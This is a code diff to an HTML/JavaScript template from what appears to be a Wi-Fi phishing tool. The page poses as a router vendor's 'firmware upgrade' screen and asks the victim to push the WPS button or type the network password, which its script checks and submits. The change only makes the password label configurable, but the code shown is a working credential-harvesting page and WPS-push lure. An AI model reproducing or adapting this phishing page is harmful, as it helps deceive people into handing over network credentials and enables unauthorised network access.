@@ -170,7 +170,7 @@ In no event shall {{ target_ap_vendor }} Company or any other party which has be
         </div>
       </div>
       <div class="form-group-has-feedback" id="psk_field">
-          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key:</label>
+          <label for="pwd">{{ target_ap_encryption }} {{ password_name }}:</label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
@@ -269,7 +269,7 @@ if ("0" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
     document.getElementById('psk_field').style.display = 'none';
     pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Awaiting user to push the WPS button to initialize firmware upgrade.";
 } else if ("1" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
-    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Awaiting user to push the WPS button or enter the Pre-Shared key to initialize firmware upgrade.";
+    pw_status_element.innerHTML = "<i class=\"fa fa-info-circle\"></i>Awaiting user to push the WPS button or enter the {{ password_name }} to initialize firmware upgrade.";
 }
 
 /*
@@ -345,7 +345,7 @@ $("#btn").on("click", function(e) {
                             } else if (verify_status == 'fail') {
                                 pw_status_element.style.color = "#D8000C";
                                 pw_status_element.style.backgroundColor = "#FFD2D2";
-                                pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>The provided Pre-shared Key (PSK) is invalid!"
+                                pw_status_element.innerHTML = "<i class=\"fa fa-times-circle\"></i>The provided {{ password_name }} is invalid!"
                             } else {
                                 /* we may not define the extensions and in that case
                                    just post the passphrase */
